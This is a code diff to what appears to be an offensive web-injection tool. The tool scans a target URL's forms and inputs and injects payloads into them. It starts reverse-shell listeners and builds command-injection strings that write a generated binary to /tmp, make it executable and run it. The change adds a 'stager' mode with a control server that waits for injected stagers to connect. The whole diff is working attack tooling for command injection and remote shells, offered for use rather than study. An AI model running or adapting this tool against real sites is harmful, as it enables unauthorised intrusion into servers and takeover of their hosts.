@@ -2,12 +2,13 @@
 
 import argparse
 
-from payloads import Monkey, Generator, ControlTower
+from payloads import Monkey, Generator
 
-from server import ReverseListener
+from server import ReverseListener, ControlTower
 
 import random
 import string
+import time
 
 parser = argparse.ArgumentParser(description='Test')
 
@@ -23,9 +24,11 @@ def comma_separated(names):
 
 PAYLOAD_TYPES = ['shell', 'binshell', 'stager', 'custom']
 
+STAGER_CONTROL_PORT = random.randint(12000, 20000)  # should this be an arg?
+
 parser.add_argument('target_url', help='Target URL')
 parser.add_argument('-lhost', '--lhost', help='Server ip the payload connects to', default='127.0.0.1')
-parser.add_argument('-lport', '--lport', help="Port the payload connects to", default='80')
+parser.add_argument('-lport', '--lport', help="Port the payload connects to", default=random.randint(12000, 20000))
 parser.add_argument('-ptype', '--ptype', help=f"Port of the server the payload connects to: {', '.join(PAYLOAD_TYPES)}", default='shell')
 parser.add_argument('-payload', '--payload', help="if ptype is custom, provide your own string to inject", default=None)
 parser.add_argument('-names', type=comma_separated, help="Comma-separated list of names to inject (website input points of your choosing)", default=[])
@@ -83,11 +86,6 @@ try:
 
     generator = Generator(lhost=LHOST, lport=LPORT)
 
-    listener = ReverseListener(
-        ip=LHOST, port=LPORT, cmd_cb=None, recv_cb=on_recv, success_cb=on_shell, once=False)
-
-    listener.start()
-
     if monkey.get_forms() is None and monkey.get_inputs() is None:
         print("Nowhere to inject")
         exit(1)
@@ -96,21 +94,43 @@ try:
     print(monkey.get_js_urls())
 
     if args.ptype == 'shell':
+        listener = ReverseListener(
+            ip=LHOST, port=LPORT, cmd_cb=None, recv_cb=on_recv, success_cb=on_shell, once=False)
+
+        listener.start()
+
         pl = generator.ir_shell()
 
     elif args.ptype == 'binshell':
+        listener = ReverseListener(
+            ip=LHOST, port=LPORT, cmd_cb=None, recv_cb=on_recv, success_cb=on_shell, once=False)
+
+        listener.start()
+
         pl_bin = generator.ir_bin()
         n = randword(4)
         pl = f'printf "{pl_bin}" > /tmp/{n} && chmod +x /tmp/{n} && /tmp/{n}'
 
     elif args.ptype == 'stager':
-        pl_bin = generator.ir_master()
+        pl_bin = generator.ir_stager()
         n = randword(4)
         pl = f'printf "{pl_bin}" > /tmp/{n} && chmod +x /tmp/{n} && /tmp/{n}'
 
-        ct = ControlTower()
+        def on_connect(ct):
+            print('Stager injected, what to do?')
+            test = input('>')
+            print('TEST', test)
+
+        ct = ControlTower(ip=LHOST, port=int(STAGER_CONTROL_PORT), success_cb=on_connect)
+
+        ct.start()
 
     elif args.ptype == 'custom':
+        listener = ReverseListener(
+            ip=LHOST, port=LPORT, cmd_cb=None, recv_cb=on_recv, success_cb=on_shell, once=False)
+
+        listener.start()
+
         pl = args.payload
 
     if monkey.get_forms():
@@ -126,7 +146,7 @@ try:
         shell = generator.ir_shell()
         monkey.autoinject_urls()
 
-    if not has_shell:
+    if not has_shell and args.ptype != 'stager':
         print("\n")
         if not args.payload:  # if we don't care about output
             print("Failed :(")
